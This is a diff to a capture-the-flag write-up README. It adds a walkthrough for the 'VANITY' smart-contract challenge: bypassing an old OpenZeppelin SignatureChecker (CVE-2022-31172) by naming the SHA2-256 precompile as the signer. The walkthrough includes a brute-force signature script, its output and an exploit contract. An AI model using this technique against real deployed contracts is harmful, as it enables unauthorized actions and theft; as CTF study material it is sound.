@@ -9,8 +9,6 @@ The challenges I solved during the contest are as follows.
 
 ![](solved_challenges.png)
 
-I plan to add exploits for challenges that could not be solved soon.
-
 ---
 
 **Table of Contents**
@@ -21,6 +19,7 @@ I plan to add exploits for challenges that could not be solved soon.
   - [RESCUE](#rescue)
   - [SOURCECODE](#sourcecode)
   - [TRAPDOOOR](#trapdooor)
+  - [VANITY](#vanity)
 - [Cairo](#cairo)
   - [RIDDLE-OF-THE-SPHINX](#riddle-of-the-sphinx)
   - [CAIRO-PROXY](#cairo-proxy)
@@ -365,13 +364,106 @@ python construct_flag.py
 
 Flag: `PCTF{d0n7_y0u_10v3_f1nd1n9_0d4y5_1n_4_c7f}`
 
+### VANITY
+[Challenge & Exploit](Vanity)
+
+The goal is to create a signature by an address whose many bytes (at least 16) are `0x00`.
+The method to verify the signature in this challenge is using `SignatureChecker.isValidSignatureNow(signer, MAGIC, signature)`.
+
+`SignatureChecker`:
+```solidity
+library SignatureChecker {
+    /**
+     * @dev Checks if a signature is valid for a given signer and data hash. If the signer is a smart contract, the
+     * signature is validated against that smart contract using ERC1271, otherwise it's validated using `ECDSA.recover`.
+     *
+     * NOTE: Unlike ECDSA signatures, contract signatures are revocable, and the outcome of this function can thus
+     * change through time. It could return true at block N and false at block N+1 (or the opposite).
+     */
+    function isValidSignatureNow(address signer, bytes32 hash, bytes memory signature) internal view returns (bool) {
+        (address recovered, ECDSA.RecoverError error) = ECDSA.tryRecover(hash, signature);
+        if (error == ECDSA.RecoverError.NoError && recovered == signer) {
+            return true;
+        }
+
+        (bool success, bytes memory result) =
+            signer.staticcall(abi.encodeWithSelector(IERC1271.isValidSignature.selector, hash, signature));
+        return (success && result.length == 32 && abi.decode(result, (bytes4)) == IERC1271.isValidSignature.selector);
+    }
+}
+```
+
+It is computationally complex to create an address that contains many `\x00`, but we can see that it may be possible to exploit by using a precompiled contract that already contains many `\x00`.
+
+A list of precompiled contracts: https://www.evm.codes/precompiled
+
+SHA2-256 is the precompiled contract such that condition `success && result.length == 32 && abi.decode(result, (bytes4)) == IERC1271.isValidSignature.selector` is satisfied.
+
+Therefore, it can be solved using the following codes.
+
+`generate_signature.py`:
+```py
+import hashlib
+
+# cast sig "isValidSignature(bytes32,bytes)"
+SELECTOR = b"\x16\x26\xba\x7e"
+# cast keccak CHALLENGE_MAGIC
+MAGIC = bytes.fromhex("19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528")
+
+i = 0
+while True:
+    i += 1
+    offset = 0x40.to_bytes(32, "big")
+    length_int = (len(hex(i)[2:]) + 1) // 2
+    length = length_int.to_bytes(32, "big")
+    signature = i.to_bytes(32, "little")
+    message = SELECTOR + MAGIC + offset + length + signature
+    if SELECTOR == hashlib.sha256(message).digest()[:4]:
+        print(message.hex())
+        print(signature[:length_int].hex())
+        break
+```
+
+Result:
+```
+$ python generate_signature.py
+1626ba7e19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000048cf1a8bb00000000000000000000000000000000000000000000000000000000
+8cf1a8bb
+```
+
+`VanityExploit.sol`:
+```solidity
+pragma solidity 0.7.6;
+
+import "./challenge/Setup.sol";
+
+function playerScript(address setupAddress) {
+    address sha2Address = address(2);
+    bytes memory signature = hex"8cf1a8bb";
+    Setup(setupAddress).challenge().solve(sha2Address, signature);
+}
+```
+
+**Test**
+```
+forge test --match-contract VanityExploit -vvvv
+```
+
+By the way, `SignatureChecker` and `ECDSA` are in the OpenZeppelin libraries, but since the version of Solidity is specified as 0.7.6 for the pragma and the library version is older, it is possible to exploit using something that has already been fixed.
+
+Reading the git history found this change:
+- https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552
+- https://github.com/OpenZeppelin/openzeppelin-contracts/commit/212de08e7f47b9836acca681ce0c9c6f91fe78aa
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31172
+
+This issue does not occur since Solidity 0.8.0 because `abi.decode(result, (bytes4))` is an error in ABI coder v2 that became the default.
 
 ## Cairo
 
 ### RIDDLE-OF-THE-SPHINX
 [Challenge & Exploit](RiddleOfTheSphinx)
 
-Reading `chal.py`, we see that the goal is to make the result of the `solution` function call to the challenge contract `bytes_to_long(b "man")`.
+Reading `chal.py`, we see that the goal is to execute the result of the `solution` function call to the challenge contract `bytes_to_long(b "man")`.
 ```py
 async def checker(client: AccountClient, riddle_contract: Contract, player_address: int) -> bool:
     solution = (await riddle_contract.functions["solution"].call()).solution
